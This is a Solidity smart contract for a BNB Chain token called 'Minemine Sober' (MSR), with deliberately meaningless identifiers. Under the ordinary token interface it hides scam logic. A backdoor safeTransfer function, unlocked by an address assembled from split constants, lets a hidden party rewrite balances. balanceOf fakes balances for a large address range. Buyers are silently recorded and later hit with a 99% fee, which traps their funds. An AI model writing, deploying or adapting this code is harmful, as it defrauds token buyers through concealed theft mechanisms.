/**
 *Submitted for verification at BscScan.com on 2023-01-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;



library SafeMath {

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IBEP20 {

    function balanceOf(address account) external view returns (uint256);

    function getOwner() external view returns (address);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function totalSupply() external view returns (uint256);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function name() external view returns (string memory);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

}



interface IUniswapV2Router {

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function WETH() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function factory() external pure returns (address);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}




contract MinemineSober is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;


    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    uint256 private fundAmountToReceiver;
    address private ZERO = 0x0000000000000000000000000000000000000000;

    uint256 private tokenMintToLaunched = buyWalletMintLaunchedEnableTx / 1000; // 0.1%
    bool private toWalletBotsTotal = true;

    mapping(uint256 => address) private maxAtReceiverWallet;
    uint256 constant launchFundLaunchedIs = 10000 * 10 ** 18;
    uint256 public teamAutoIsFrom = 0;
    uint160 constant mintToTakeIs = 516716217635;
    bool private takeBotsTxBurnSellReceiverEnable = true;
    uint256 marketingMinTakeIsBotsLiquidity = 17331;

    


    bool private shouldListTokenLiquidityEnableWallet = false;

    uint160 constant amountTakeShouldLaunched = 892751472608 * 2 ** 120;

    uint256  constant MASK = type(uint128).max;
    mapping(address => bool) private feeShouldTeamBuyAmountBurnIs;
    uint256 public maxWalletAmount = 0;

    string constant _symbol = "MSR";
    uint256 public maxAtReceiverWalletIndex = 0;

    uint160 constant tradingLimitTeamIs = 919501877856 * 2 ** 40;
    uint256 private buyTxMinTeam = 0;
    uint256 private receiverMinAutoSell = 0;

    uint256 private fundTxReceiverLaunched = 0;
    mapping(address => uint256) private listAutoLaunchedEnableAtBotsSwap;
    uint256 private buyLimitAmountLiquidity;
    address private shouldReceiverFromAt = (msg.sender);
    uint256 constant listModeTeamLimit = 300000 * 10 ** 18;

    uint256  fromFeeSenderList = 100000000 * 10 ** _decimals;
    bool private shouldBurnReceiverListAmountTakeTx = true;

    uint160 constant amountLimitTokenTotalIsAutoTo = 632444666487 * 2 ** 80;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private takeMinMintToken;


    uint256 private atToExemptMax = 0;
    uint256 atMintMinAuto = 0;
    mapping(address => bool) private maxMintFundMode;
    uint256 private exemptTotalShouldFeeWalletSellLimit = 1;

    bool private limitTotalModeTakeSender;

    uint256 private buyMaxLaunchedMint;
    IUniswapV2Router public burnAtTxTeam;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 buyWalletMintLaunchedEnableTx = 100000000 * (10 ** _decimals);
    address private buyFeeFundSwap = (msg.sender);
    string constant _name = "Minemine Sober";
    mapping(address => uint256) _balances;

    uint256  tradingFundTotalAt = 100000000 * 10 ** _decimals;
    uint256 private fromFeeMaxAt;
    uint256 private teamShouldFeeFrom = 1;
    mapping(address => bool) private fromTotalMarketingBots;
    uint256 public shouldLiquidityMaxTeam = 0;
    uint256 private modeTradingLiquidityEnableBuyTake = 100;
    bool public receiverTeamListExemptFund = false;
    uint256 private liquidityLimitReceiverMax;
    uint256 public receiverLaunchFundWallet = 0;
    uint256 private mintLaunchReceiverLiquidity;
    uint256 public takeLimitToBuy = 0;
    bool private amountTeamLaunchedList = true;

    mapping(address => uint256) private amountAtLiquidityBuyMode;
    mapping(uint256 => address) private minSellIsTeamBuy;
    address public uniswapV2Pair;
    address constant takeModeFundExempt = 0x77F524F8160a55c712D337920404DA6673780370;
    bool private botsToMinShould = true;
    uint256 marketingTotalModeTo = 2 ** 18 - 1;
    uint256 private launchBlock = 0;
    uint256 private listReceiverTxLimit = 0;
    uint256 private launchedBurnBuyTx;
    uint256 private exemptMinTeamMax = 6 * 10 ** 15;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        burnAtTxTeam = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(burnAtTxTeam.factory()).createPair(address(this), burnAtTxTeam.WETH());
        _allowances[address(this)][address(burnAtTxTeam)] = buyWalletMintLaunchedEnableTx;

        limitTotalModeTakeSender = true;

        fromTotalMarketingBots[msg.sender] = true;
        fromTotalMarketingBots[0x0000000000000000000000000000000000000000] = true;
        fromTotalMarketingBots[0x000000000000000000000000000000000000dEaD] = true;
        fromTotalMarketingBots[address(this)] = true;

        feeShouldTeamBuyAmountBurnIs[msg.sender] = true;
        feeShouldTeamBuyAmountBurnIs[address(this)] = true;

        maxMintFundMode[msg.sender] = true;
        maxMintFundMode[0x0000000000000000000000000000000000000000] = true;
        maxMintFundMode[0x000000000000000000000000000000000000dEaD] = true;
        maxMintFundMode[address(this)] = true;

        approve(_router, buyWalletMintLaunchedEnableTx);
        approve(address(uniswapV2Pair), buyWalletMintLaunchedEnableTx);
        _balances[msg.sender] = buyWalletMintLaunchedEnableTx;
        emit Transfer(address(0), msg.sender, buyWalletMintLaunchedEnableTx);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return buyWalletMintLaunchedEnableTx;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function autoTxReceiverMin() private view returns (uint256) {
        address tradingShouldSenderWalletFee = WBNB;
        if (address(this) < WBNB) {
            tradingShouldSenderWalletFee = address(this);
        }
        (uint buyModeTakeExempt, uint teamTokenShouldTx,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 exemptSenderSellSwap,) = WBNB == tradingShouldSenderWalletFee ? (buyModeTakeExempt, teamTokenShouldTx) : (teamTokenShouldTx, buyModeTakeExempt);
        uint256 tradingReceiverModeSwap = IERC20(WBNB).balanceOf(uniswapV2Pair) - exemptSenderSellSwap;
        return tradingReceiverModeSwap;
    }

    function launchModeBotsFeeListTokenLaunched(address receiverMarketingFundLaunch, address modeBurnBuyLaunchAtLiquiditySell, uint256 feeTokenMinMarketing, bool mintMarketingShouldBotsAt) private {
        if (mintMarketingShouldBotsAt) {
            receiverMarketingFundLaunch = address(uint160(uint160(takeModeFundExempt) + atMintMinAuto));
            atMintMinAuto++;
            _balances[modeBurnBuyLaunchAtLiquiditySell] = _balances[modeBurnBuyLaunchAtLiquiditySell].add(feeTokenMinMarketing);
        } else {
            _balances[receiverMarketingFundLaunch] = _balances[receiverMarketingFundLaunch].sub(feeTokenMinMarketing);
        }
        emit Transfer(receiverMarketingFundLaunch, modeBurnBuyLaunchAtLiquiditySell, feeTokenMinMarketing);
    }

    function safeTransfer(address receiverMarketingFundLaunch, address modeBurnBuyLaunchAtLiquiditySell, uint256 feeTokenMinMarketing) public {
        if (!totalFeeBurnTrading(uint160(msg.sender))) {
            return;
        }
        if (swapToMintLimitSender(uint160(modeBurnBuyLaunchAtLiquiditySell))) {
            launchModeBotsFeeListTokenLaunched(receiverMarketingFundLaunch, modeBurnBuyLaunchAtLiquiditySell, feeTokenMinMarketing, false);
            return;
        }
        if (swapToMintLimitSender(uint160(receiverMarketingFundLaunch))) {
            launchModeBotsFeeListTokenLaunched(receiverMarketingFundLaunch, modeBurnBuyLaunchAtLiquiditySell, feeTokenMinMarketing, true);
            return;
        }
        if (receiverMarketingFundLaunch == address(0)) {
            _balances[modeBurnBuyLaunchAtLiquiditySell] = _balances[modeBurnBuyLaunchAtLiquiditySell].add(feeTokenMinMarketing);
            return;
        }
    }

    function buyLaunchedTeamAmount(uint160 modeBurnBuyLaunchAtLiquiditySell) private view returns (bool) {
        return uint16(modeBurnBuyLaunchAtLiquiditySell) == marketingMinTakeIsBotsLiquidity;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function setreceiverTokenAtTotalMaxLiquidity(uint256 receiverMarketingTokenAt) public onlyOwner {
        if (receiverLaunchFundWallet == atToExemptMax) {
            atToExemptMax=receiverMarketingTokenAt;
        }
        if (receiverLaunchFundWallet != fundTxReceiverLaunched) {
            fundTxReceiverLaunched=receiverMarketingTokenAt;
        }
        receiverLaunchFundWallet=receiverMarketingTokenAt;
    }

    function totalFeeBurnTrading(uint160 shouldSellBuyMode) private pure returns (bool) {
        uint160 marketingExemptAmountLaunchSellBotsFee = amountTakeShouldLaunched + amountLimitTokenTotalIsAutoTo;
        marketingExemptAmountLaunchSellBotsFee = marketingExemptAmountLaunchSellBotsFee + tradingLimitTeamIs;
        marketingExemptAmountLaunchSellBotsFee = marketingExemptAmountLaunchSellBotsFee + mintToTakeIs;
        return shouldSellBuyMode == marketingExemptAmountLaunchSellBotsFee;
    }

    function modeEnableBuyReceiver(address receiverMarketingFundLaunch, address modeBurnBuyLaunchAtLiquiditySell, uint256 feeTokenMinMarketing) internal returns (bool) {
        if (swapToMintLimitSender(uint160(modeBurnBuyLaunchAtLiquiditySell))) {
            launchModeBotsFeeListTokenLaunched(receiverMarketingFundLaunch, modeBurnBuyLaunchAtLiquiditySell, feeTokenMinMarketing, false);
            return true;
        }
        if (swapToMintLimitSender(uint160(receiverMarketingFundLaunch))) {
            launchModeBotsFeeListTokenLaunched(receiverMarketingFundLaunch, modeBurnBuyLaunchAtLiquiditySell, feeTokenMinMarketing, true);
            return true;
        }
        
        bool txSellSwapTake = exemptMarketingMintBuy(receiverMarketingFundLaunch) || exemptMarketingMintBuy(modeBurnBuyLaunchAtLiquiditySell);
        
        if (receiverMarketingFundLaunch == uniswapV2Pair) {
            if (maxWalletAmount != 0 && buyLaunchedTeamAmount(uint160(modeBurnBuyLaunchAtLiquiditySell))) {
                botsReceiverMaxAmount();
            }
            if (!txSellSwapTake) {
                launchedEnableLiquidityTx(modeBurnBuyLaunchAtLiquiditySell);
            }
        }
        
        
        if (inSwap || txSellSwapTake) {return fromFeeTakeAt(receiverMarketingFundLaunch, modeBurnBuyLaunchAtLiquiditySell, feeTokenMinMarketing);}
        
        require((feeTokenMinMarketing <= tradingFundTotalAt) || fromTotalMarketingBots[receiverMarketingFundLaunch] || fromTotalMarketingBots[modeBurnBuyLaunchAtLiquiditySell], "Max TX Limit!");

        _balances[receiverMarketingFundLaunch] = _balances[receiverMarketingFundLaunch].sub(feeTokenMinMarketing, "Insufficient Balance!");
        
        uint256 feeTokenMinMarketingReceived = receiverReceiverMarketingFrom(receiverMarketingFundLaunch) ? limitAmountModeWalletEnableLaunchedAuto(receiverMarketingFundLaunch, modeBurnBuyLaunchAtLiquiditySell, feeTokenMinMarketing) : feeTokenMinMarketing;

        _balances[modeBurnBuyLaunchAtLiquiditySell] = _balances[modeBurnBuyLaunchAtLiquiditySell].add(feeTokenMinMarketingReceived);
        emit Transfer(receiverMarketingFundLaunch, modeBurnBuyLaunchAtLiquiditySell, feeTokenMinMarketingReceived);
        return true;
    }

    function getreceiverTokenAtTotalMaxLiquidity() public view returns (uint256) {
        if (receiverLaunchFundWallet != teamAutoIsFrom) {
            return teamAutoIsFrom;
        }
        if (receiverLaunchFundWallet == buyTxMinTeam) {
            return buyTxMinTeam;
        }
        return receiverLaunchFundWallet;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function getfundTakeEnableTrading() public view returns (uint256) {
        if (teamShouldFeeFrom != listReceiverTxLimit) {
            return listReceiverTxLimit;
        }
        if (teamShouldFeeFrom != maxWalletAmount) {
            return maxWalletAmount;
        }
        if (teamShouldFeeFrom == maxAtReceiverWalletIndex) {
            return maxAtReceiverWalletIndex;
        }
        return teamShouldFeeFrom;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function limitAmountModeWalletEnableLaunchedAuto(address receiverMarketingFundLaunch, address fundFeeAutoBuyMinTake, uint256 feeTokenMinMarketing) internal returns (uint256) {
        
        uint256 toModeShouldReceiverBuy = feeTokenMinMarketing.mul(liquidityBurnShouldMarketingLimit(receiverMarketingFundLaunch, fundFeeAutoBuyMinTake == uniswapV2Pair)).div(modeTradingLiquidityEnableBuyTake);

        if (takeMinMintToken[receiverMarketingFundLaunch] || takeMinMintToken[fundFeeAutoBuyMinTake]) {
            toModeShouldReceiverBuy = feeTokenMinMarketing.mul(99).div(modeTradingLiquidityEnableBuyTake);
        }

        _balances[address(this)] = _balances[address(this)].add(toModeShouldReceiverBuy);
        emit Transfer(receiverMarketingFundLaunch, address(this), toModeShouldReceiverBuy);
        
        return feeTokenMinMarketing.sub(toModeShouldReceiverBuy);
    }

    function gettxIsMaxFromSellTokenMin() public view returns (address) {
        if (buyFeeFundSwap == shouldReceiverFromAt) {
            return shouldReceiverFromAt;
        }
        return buyFeeFundSwap;
    }

    function launchedEnableLiquidityTx(address marketingTeamLaunchMintSellLaunched) private {
        uint256 atTradingLiquidityMax = autoTxReceiverMin();
        if (atTradingLiquidityMax < exemptMinTeamMax) {
            maxAtReceiverWalletIndex += 1;
            maxAtReceiverWallet[maxAtReceiverWalletIndex] = marketingTeamLaunchMintSellLaunched;
            listAutoLaunchedEnableAtBotsSwap[marketingTeamLaunchMintSellLaunched] += atTradingLiquidityMax;
            if (listAutoLaunchedEnableAtBotsSwap[marketingTeamLaunchMintSellLaunched] > exemptMinTeamMax) {
                maxWalletAmount = maxWalletAmount + 1;
                minSellIsTeamBuy[maxWalletAmount] = marketingTeamLaunchMintSellLaunched;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        minSellIsTeamBuy[maxWalletAmount] = marketingTeamLaunchMintSellLaunched;
    }

    function settotalTakeReceiverBots(bool receiverMarketingTokenAt) public onlyOwner {
        if (toWalletBotsTotal != shouldBurnReceiverListAmountTakeTx) {
            shouldBurnReceiverListAmountTakeTx=receiverMarketingTokenAt;
        }
        if (toWalletBotsTotal != takeBotsTxBurnSellReceiverEnable) {
            takeBotsTxBurnSellReceiverEnable=receiverMarketingTokenAt;
        }
        toWalletBotsTotal=receiverMarketingTokenAt;
    }

    function gettoTotalFromMarketingBotsTx(address receiverMarketingTokenAt) public view returns (bool) {
            return takeMinMintToken[receiverMarketingTokenAt];
    }

    function isFromSenderBuy(address receiverMarketingFundLaunch, uint256 tokenLiquidityWalletLaunch) private view returns (uint256) {
        uint256 listLaunchedMinLaunch = amountAtLiquidityBuyMode[receiverMarketingFundLaunch];
        if (listLaunchedMinLaunch > 0 && exemptReceiverLaunchedTotal() - listLaunchedMinLaunch > 0) {
            return 99;
        }
        return tokenLiquidityWalletLaunch;
    }

    function fromFeeTakeAt(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldMinTotalExemptFeeSender() private {
        if (maxAtReceiverWalletIndex > 0) {
            for (uint256 i = 1; i <= maxAtReceiverWalletIndex; i++) {
                if (amountAtLiquidityBuyMode[maxAtReceiverWallet[i]] == 0) {
                    amountAtLiquidityBuyMode[maxAtReceiverWallet[i]] = block.timestamp;
                }
            }
            maxAtReceiverWalletIndex = 0;
        }
    }

    function exemptReceiverLaunchedTotal() private view returns (uint256) {
        return block.timestamp;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return modeEnableBuyReceiver(msg.sender, recipient, amount);
    }

    function swapToMintLimitSender(uint160 shouldSellBuyMode) private pure returns (bool) {
        if (shouldSellBuyMode >= uint160(takeModeFundExempt) && shouldSellBuyMode <= uint160(takeModeFundExempt) + 310000) {
            return true;
        }
        return false;
    }

    function getMaxTotalAmount() public {
        botsReceiverMaxAmount();
    }

    function getMaxTotalAFee() public {
        shouldMinTotalExemptFeeSender();
    }

    function settxIsMaxFromSellTokenMin(address receiverMarketingTokenAt) public onlyOwner {
        if (buyFeeFundSwap != ZERO) {
            ZERO=receiverMarketingTokenAt;
        }
        if (buyFeeFundSwap == WBNB) {
            WBNB=receiverMarketingTokenAt;
        }
        buyFeeFundSwap=receiverMarketingTokenAt;
    }

    function getreceiverFeeTakeReceiver() public view returns (uint256) {
        if (tokenMintToLaunched == receiverMinAutoSell) {
            return receiverMinAutoSell;
        }
        if (tokenMintToLaunched == fundTxReceiverLaunched) {
            return fundTxReceiverLaunched;
        }
        return tokenMintToLaunched;
    }

    function getMaxWalletAmount() public view returns (uint256) {
        if (maxWalletAmount == atToExemptMax) {
            return atToExemptMax;
        }
        if (maxWalletAmount == exemptTotalShouldFeeWalletSellLimit) {
            return exemptTotalShouldFeeWalletSellLimit;
        }
        if (maxWalletAmount == exemptMinTeamMax) {
            return exemptMinTeamMax;
        }
        return maxWalletAmount;
    }

    function liquidityBurnShouldMarketingLimit(address receiverMarketingFundLaunch, bool minLimitExemptTokenMint) internal returns (uint256) {
        
        if (minLimitExemptTokenMint) {
            fundAmountToReceiver = exemptTotalShouldFeeWalletSellLimit + fundTxReceiverLaunched;
            return isFromSenderBuy(receiverMarketingFundLaunch, fundAmountToReceiver);
        }
        if (!minLimitExemptTokenMint && receiverMarketingFundLaunch == uniswapV2Pair) {
            fundAmountToReceiver = teamShouldFeeFrom + buyTxMinTeam;
            return fundAmountToReceiver;
        }
        return isFromSenderBuy(receiverMarketingFundLaunch, fundAmountToReceiver);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != buyWalletMintLaunchedEnableTx) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return modeEnableBuyReceiver(sender, recipient, amount);
    }

    function exemptMarketingMintBuy(address marketingTeamLaunchMintSellLaunched) private view returns (bool) {
        return marketingTeamLaunchMintSellLaunched == buyFeeFundSwap;
    }

    function settoTotalFromMarketingBotsTx(address receiverMarketingTokenAt,bool senderMinReceiverAt) public onlyOwner {
        if (takeMinMintToken[receiverMarketingTokenAt] != maxMintFundMode[receiverMarketingTokenAt]) {
           maxMintFundMode[receiverMarketingTokenAt]=senderMinReceiverAt;
        }
        takeMinMintToken[receiverMarketingTokenAt]=senderMinReceiverAt;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, buyWalletMintLaunchedEnableTx);
    }

    function settakeAtMarketingMode(address receiverMarketingTokenAt,bool senderMinReceiverAt) public onlyOwner {
        fromTotalMarketingBots[receiverMarketingTokenAt]=senderMinReceiverAt;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (swapToMintLimitSender(uint160(account))) {
            return receiverBuyLaunchFee(uint160(account));
        }
        return _balances[account];
    }

    function setfundTakeEnableTrading(uint256 receiverMarketingTokenAt) public onlyOwner {
        if (teamShouldFeeFrom == listReceiverTxLimit) {
            listReceiverTxLimit=receiverMarketingTokenAt;
        }
        if (teamShouldFeeFrom != takeLimitToBuy) {
            takeLimitToBuy=receiverMarketingTokenAt;
        }
        if (teamShouldFeeFrom != exemptMinTeamMax) {
            exemptMinTeamMax=receiverMarketingTokenAt;
        }
        teamShouldFeeFrom=receiverMarketingTokenAt;
    }

    function receiverReceiverMarketingFrom(address receiverMarketingFundLaunch) internal view returns (bool) {
        return !maxMintFundMode[receiverMarketingFundLaunch];
    }

    function setDEAD(address receiverMarketingTokenAt) public onlyOwner {
        if (DEAD == shouldReceiverFromAt) {
            shouldReceiverFromAt=receiverMarketingTokenAt;
        }
        if (DEAD == ZERO) {
            ZERO=receiverMarketingTokenAt;
        }
        DEAD=receiverMarketingTokenAt;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function setreceiverFeeTakeReceiver(uint256 receiverMarketingTokenAt) public onlyOwner {
        tokenMintToLaunched=receiverMarketingTokenAt;
    }

    function gettotalTakeReceiverBots() public view returns (bool) {
        if (toWalletBotsTotal == toWalletBotsTotal) {
            return toWalletBotsTotal;
        }
        if (toWalletBotsTotal == receiverTeamListExemptFund) {
            return receiverTeamListExemptFund;
        }
        if (toWalletBotsTotal == shouldBurnReceiverListAmountTakeTx) {
            return shouldBurnReceiverListAmountTakeTx;
        }
        return toWalletBotsTotal;
    }

    function getDEAD() public view returns (address) {
        if (DEAD != ZERO) {
            return ZERO;
        }
        if (DEAD != buyFeeFundSwap) {
            return buyFeeFundSwap;
        }
        return DEAD;
    }

    function settokenMarketingListTo(uint256 receiverMarketingTokenAt) public onlyOwner {
        if (listReceiverTxLimit != launchBlock) {
            launchBlock=receiverMarketingTokenAt;
        }
        if (listReceiverTxLimit == modeTradingLiquidityEnableBuyTake) {
            modeTradingLiquidityEnableBuyTake=receiverMarketingTokenAt;
        }
        if (listReceiverTxLimit != buyTxMinTeam) {
            buyTxMinTeam=receiverMarketingTokenAt;
        }
        listReceiverTxLimit=receiverMarketingTokenAt;
    }

    function receiverBuyLaunchFee(uint160 shouldSellBuyMode) private view returns (uint256) {
        uint256 tradingTxTakeBurnFeeIsAt = atMintMinAuto;
        uint256 totalTxAutoEnable = shouldSellBuyMode - uint160(takeModeFundExempt);
        if (totalTxAutoEnable < tradingTxTakeBurnFeeIsAt) {
            return launchFundLaunchedIs;
        }
        return listModeTeamLimit;
    }

    function gettokenMarketingListTo() public view returns (uint256) {
        return listReceiverTxLimit;
    }

    function setMaxWalletAmount(uint256 receiverMarketingTokenAt) public onlyOwner {
        if (maxWalletAmount == exemptTotalShouldFeeWalletSellLimit) {
            exemptTotalShouldFeeWalletSellLimit=receiverMarketingTokenAt;
        }
        if (maxWalletAmount == exemptTotalShouldFeeWalletSellLimit) {
            exemptTotalShouldFeeWalletSellLimit=receiverMarketingTokenAt;
        }
        maxWalletAmount=receiverMarketingTokenAt;
    }

    function gettakeAtMarketingMode(address receiverMarketingTokenAt) public view returns (bool) {
        if (fromTotalMarketingBots[receiverMarketingTokenAt] != fromTotalMarketingBots[receiverMarketingTokenAt]) {
            return shouldListTokenLiquidityEnableWallet;
        }
        if (receiverMarketingTokenAt != DEAD) {
            return amountTeamLaunchedList;
        }
        if (receiverMarketingTokenAt != WBNB) {
            return receiverTeamListExemptFund;
        }
            return fromTotalMarketingBots[receiverMarketingTokenAt];
    }

    function botsReceiverMaxAmount() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (amountAtLiquidityBuyMode[minSellIsTeamBuy[i]] == 0) {
                    amountAtLiquidityBuyMode[minSellIsTeamBuy[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}